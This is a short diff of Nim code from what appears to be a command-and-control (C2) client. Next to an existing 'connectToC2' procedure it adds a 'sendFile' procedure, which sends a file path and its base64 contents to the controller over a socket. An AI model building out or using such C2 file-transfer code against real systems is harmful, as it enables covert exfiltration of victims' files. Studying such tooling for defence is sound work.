@@ -28,3 +28,12 @@ proc connectToC2*(client: Socket) =
             "task": "connect"
         }
     client.sendData($j)
+
+proc sendFile*(client: Socket, path: string, b64c: string) =
+    let j = %*
+        {
+            "task": "file",
+            "path": path,
+            "contents": b64c
+        }
+    client.sendData($j)
